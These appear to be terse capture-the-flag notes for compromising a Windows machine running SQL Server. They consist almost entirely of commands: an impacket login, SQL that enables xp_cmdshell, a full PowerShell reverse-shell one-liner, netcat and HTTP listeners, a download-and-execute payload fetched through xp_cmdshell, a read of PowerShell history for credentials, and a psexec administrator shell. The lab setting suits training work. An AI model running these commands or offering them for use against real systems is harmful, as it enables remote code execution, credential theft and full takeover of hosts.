# Connect to SQL

## Command

```bash
https://github.com/SecureAuthCorp/impacket
msqlclient.py ARCHETYPE/sql_svc@<IP_ADDR> -windows-auth
```

### Verify if sysadmin

```SQL
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```

## Enumerate the system

```powershell
 $client = New-Object System.Net.Sockets.TCPClient("<IP_ADDR>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Start mini-webserver

```bash
python -m http.server 80
```

## Start netcat allow ufw callbacks

```bash
nc -lvnp 443
ufw allow from 10.10.10.27 proto tcp to any port 80,443
```

## Execute reverse shell

```powershell
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<IP_ADDR/shell.ps1\");"
```

## See frequently used files

```bash
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Gain shell

```bash
https://github.com/SecureAuthCorp/impacket
psexec.py administrator@<IP_ADDR>
```
